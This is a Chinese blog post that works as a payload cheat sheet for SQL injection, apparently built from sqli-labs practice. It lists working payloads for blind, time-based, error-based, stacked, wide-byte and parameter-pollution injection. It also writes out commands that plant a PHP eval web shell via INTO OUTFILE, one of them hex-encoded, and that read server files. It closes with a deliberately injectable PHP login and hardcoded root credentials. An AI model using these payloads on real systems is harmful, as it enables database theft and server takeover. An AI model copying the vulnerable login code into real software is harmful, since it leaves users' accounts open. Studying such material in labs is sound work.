title: SQL注入
author: John Doe
date: 2023-04-24 17:40:48
tags:
---
# 手动测试有无sql注入点
<li>添加单引号 ' 、双引号 '' 、单括号 ) 、双括号 )) ,进行组合测试，看是否报错，如果报错，就可能SQL注入漏洞。
  
## 对于数字型：
  
语句：and 1=1 ;and 1=2 （经典）

结果：在URL后面加 and 1=1 、 and 1=2 看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。

{% codeblock lang:PHP %}
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
{% endcodeblock %}

分析：and 的意思是“和”如果没有过滤我们的语句，and 1=1就会被代入SQL查询语句进行查询，
如果and前后的两条语句都是真的话就不会出错，但如果前后语句有一个为假的话，程序就会报错。也就表明程序有注入漏洞。
![upload successful](/images/pasted-546.png)
![upload successful](/images/pasted-547.png)
## 对于字符型：

语句：' and '1'=1；' and  '1=2(经典）

结果：分别返回不同的页面,说明存在注入漏洞。

{% codeblock lang:PHP %}
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
{% endcodeblock %}

分析：加入' and '1'=1返回正确页面，加入' and  '1=2返回错误页面，说明有注入漏洞。
## Timing Attack测试
也就是时间盲注，一种高级的布尔+时间盲注。有时候通过简单的条件语句比如 and 1=2 是无法看出异常的。

注：Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时，
首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 弱类型比较 ==。

![upload successful](/images/pasted-548.png)

# 盲注
盲注：就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的信息，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到了执行。

![upload successful](/images/pasted-549.png)
由此可以看出代码把 id 当成了字符来处理，而且后面还有一个限制显示的行数  limit 0,1 。当我们输入的语句正确时，就显示You are in....   当我们输入的语句错误时，就不显示任何数据。当我们的语句有语法错误时，就报出 SQL 语句错误。

于是，我们可以推断出页面的源代码
{% codeblock lang:PHP %}
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //sql查询语句
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
	if($row){                    //如果查询到数据
      	  echo 'You are in...........';
  	}else{                      //如果没查询到数据
	     print_r(mysql_error());  	
	}
{% endcodeblock %}
于是我们可以通过构造一些判断语句，通过页面是否显示来证实我们的猜想。盲注一般用到的一些函数：ascii() 、substr() 、length()，exists()、concat() 等
## 布尔盲注
什么是布尔盲注

例：?id=1' and '1   、   ?id=1' and 'a  （这里没有使用注释符号进行后面的单引号闭合，使用的是手工单引号闭合）或者   ?id=1' and 1=1#    、   ?id=1' and 1=2#

应用场景：

布尔型盲注应用于无数据回显，且WEB页面无报错信息的情况，此时不能通过报错型注入的方法来爆出数据，布尔型盲注的WEB页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。

![upload successful](/images/pasted-550.png)

![upload successful](/images/pasted-551.png)

{% codeblock lang:PHP %}
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
{% endcodeblock %}

从源码中可以看出来数据库查询的数据并没有返回到前端页面中，若果数据查询正确页面返回“You are in …”,查询错误无显示，那么我们可以儿通过页面显示正确或者错误来猜解数据库信息。

实际测试
<code>
?id=1’ --+ 正常显示
?id=1" --+ 正常显示
?id=1’and 1=1 --+ 正常显示
?id=1’ and 1=2 --+ 显示错误
</code>

布尔盲注使用到的函数：

### <b>1.substr()函数</b>

substr(string,start,length)函数是截取字符串的函数。
参数string ：被截取的字符串

参数start ：截取的起始位置（起始位为1）

参数length ：从截取位置截取的长度

在盲注时，一般只截取一位，如substr(user(),1,1),这样可以从user函数返回数据第一位开始的偏移位置截取一位，之后我们只要修改位置参数即可获取其他数据。
例：使用substr截取“qwertyui”中前5位字符

![upload successful](/images/pasted-552.png)

### <b>2.ord()函数</b>

ord(character)函数是返回一个字符的ASCII码。

参数character：为单个字符，如果是字符串的话，则只按照字符串的第一个字符计算。

把数据转换成ASCII码可以避免在payload中出现引号，还可以使用二分法方便更快的找到数据正确数据。
例：使用ord函数查询“c”的ASCII码

![upload successful](/images/pasted-553.png)

### <b>3.length()函数</b>

length(string)函数是否返回一个字符串的长度。

参数string ：为需要输出其长度的字符串。

例：使用length函数判断“qwertyui”长度

![upload successful](/images/pasted-554.png)

由此可以构造<code>payload：http://127.0.0.1/sql/Less-8/?id=1' and length(database())=8 --+</code>

![upload successful](/images/pasted-555.png)

# 报错注入
报错注入是sql注入的一种

利用前提：页面上没有显示位，但是需要输出执行错误信息。比如mysql_error()

优点：不需要显示位

缺点：需要输出mysql_error()的报错信息

## updatexml方式
{% codeblock lang:PHP %}
1' and updatexml(1,concat('!',database(),'!'),1)

1' and updatexml(1,concat('!',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'!'),1)

updatexml(1,concat('!',(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),'!'),1)

updatexml(1,concat('!',(select group_concat(username,'#',password) from users limit 0,1),'!'),1)

{% endcodeblock %}

## extractvalue方式
{% codeblock lang:PHP %}
1 and(extractvalue(1, concat(0x7e,(select database()))))
{% endcodeblock %}

## floor方式(查询数据库)
{% codeblock lang:PHP %}
1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23

1 and(select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23

{% endcodeblock %}
查询表(以emails举例,emails十六进制编码为656d61696c73)
{% codeblock lang:PHP %}
​1 and(select 1 from (select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x656d61696c73 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
{% endcodeblock %}

## exp
{% codeblock lang:PHP %}
1 and exp(~(select * from (select database())x))%23
{% endcodeblock %}

# 时间注入

构造逻辑语句，通过条件语句进行判断，为真则立即执行，否则延时执行

核心语法：
{% codeblock lang:sql %}
if(left(user(),1)='a',0,sleep(3));
{% endcodeblock %}
语句构造方式与布尔盲注基本类似，只是在外面加了一层if判断，判断为真返回第二个值，不成功返回第三个值sleep(3)

![upload successful](/images/pasted-559.png)

{% codeblock lang:PHP %}
1）猜解库名长度
1' and if(length(database())=8,sleep(5),1) -- q

2）猜解库名
if((ascii(substr(database(),1,1))=115),sleep(5),1)

3）猜解表名
if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),1)

4）猜解列名
if((ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1)
{% endcodeblock %}

# (堆查询)堆叠注入
{% codeblock lang:PHP %}
1;select if(substr(database(),1,1)='s',sleep(5),1)

1;show databases;
{% endcodeblock %}

# 宽字节注入

{% codeblock lang:PHP %}
1%df' union select 1,2,database()
{% endcodeblock %}

# HTTP污染注入
假设有一个通过GET方式提交的参数"id"，可以重复构造这个参数并发送出去：

?id=-1&id=2

使用的框架不同(PHP，Java，ASP.NET)参数字符串也会以不同的方式进行解析，比如在Apache/PHP的实验环境下，如果多次注入同一个参数值，只有最后一个参数值会被框架解析，但是只有第一个参数会经过WAF的分析和过滤
{% codeblock lang:PHP %}
https://www.baidu.com/?id=-1&id=1 union select 1,2,database()
{% endcodeblock %}

# base64注入
{% codeblock lang:PHP %}
http://localhost/sql/Less-1/id=MSBhbmQgMCB1bmlvbiBzZWxlY3QgMSwyLDM=

base64_encode(1 and 0 union select 1,2,3)=>MSBhbmQgMCB1bmlvbiBzZWxlY3QgMSwyLDM=
{% endcodeblock %}

# Cookie注入、Referer注入、UA注入、XFF注入

手法略同，只是注入点不同

# 预编译注入
{% codeblock lang:PHP %}
1';use sqli;set @sql=concat('se','lect `字段` from `表名`');PREPARE ganyu FROM @sql;EXECUTE ganyu;#
{% endcodeblock %}

![upload successful](/images/pasted-563.png)

# Handler注入（从表名查询字段名）

{% codeblock lang:PHP %}
1';show tables;handler `FlagHere` open;handler `FlagHere` read first;#
{% endcodeblock %}

![upload successful](/images/pasted-564.png)

# 无列名注入
{% codeblock lang:PHP %}
select b from (select 1,2,3 as b union select * from 表)a
{% endcodeblock %}

![upload successful](/images/pasted-565.png)

# 注入常见payload
{% blockquote CSDN https://blog.csdn.net/qq_58784379/article/details/120852073?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168247131016782425178046%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168247131016782425178046&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120852073-null-null.142^v86^koosearch_v1,239^v2^insert_chatgpt&utm_term=sql%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%A4%A7%E5%85%A8&spm=1018.2226.3001.4187 CSDN链接 %}
自己收集的一些常见SQL注入方式(持续更新中，增加了无列名注入和Timing Attack注入)
{% endblockquote %}

# 通过sql读写文件(写马)
<b>注：在mysql用户拥有file权限时，拥有load_file和into outfile/dumpfile进行读写</b>

![upload successful](/images/pasted-556.png)
先检查mysql的配置文件my.ini 是否设置secure这一条 经过实测 设置完成后需要重启电脑才能生效 这是phpstudy的一个小bug
![upload successful](/images/pasted-557.png)
判断完字段数后就进行写马

此语句用法就是将2位置构造函数的数据输出到自己创建的文件shell.php中

放入url中执行

代码如下 具体后面的文件路径按自己实际情况来编写 不要照搬我的路径
{% codeblock lang:PHP %}
union select 1,"<?php eval($_REQUEST[shell])?>",3 into outfile "D:/phpstudypro/WWW/sql/Less-7/shell.php" -- q

1 union select '<?php @eval($_POST['ganyu']);?>' into outfile 'var/www/html/shell.php'
绕过单引号十六进制编码
1 union select unhex(0x3C3F70687020406576616C28245F504F53545B2767616E7975275D293B3F3E) into dumpfile 'var/www/html/shell.php'
{% endcodeblock %}

![upload successful](/images/pasted-558.png)

读取:
{% codeblock lang:PHP %}
1 union select load_file('/etc/hosts')
绕过单引号十六进制编码
1 union select load_file(0x2F6574632F686F737473)
{% endcodeblock %}

# 过狗

![upload successful](/images/pasted-560.png)

# 自己写的简单代码，存在SQL注入
{% codeblock lang:index.php %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
</head>
<body>
    <form method="get" action="login.php">
        <input type="text" name="username" id="username" />
        <br/>
        <input type="password" name="userpwd" id="userpwd" />
        <br/>
        <input type="submit" name="login" id="login" value="login" />
        <br/>
    </form>

</body>
</html>
{% endcodeblock %}

{% codeblock lang:login.php %}
<?php

header("content-type:text/html;charset=utf-8");
include('mysqlserver.php'); //connect the database

$name1=$_GET["username"];

$pwd1=$_GET["userpwd"];

$sql="select * from userinfo where username='{$name1}' and userpwd='{$pwd1}'";
$result=$conn->query($sql);
$row=mysqli_num_rows($result);

if($row==1)
{
    echo $name;
    echo "<script>alert('登陆成功')</script>";
}else{
    echo "<script language=javascript>alert('登陆失败');;history.back()</script>";
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
</head>
<body>
    
</body>
</html>
{% endcodeblock %}

{% codeblock lang:mysqlserver.php %}
<?php
    $servername="localhost";
    $sqlname="root";
    $sqlpwd="root";
    $dbname="user2";
    error_reporting(0);
    $conn=new mysqli($servername,$sqlname,$sqlpwd,$dbname,3306);
    if($conn->connet_error)
    {
        die("连接失败".$conn->connet_error);
    }

?>
{% endcodeblock %}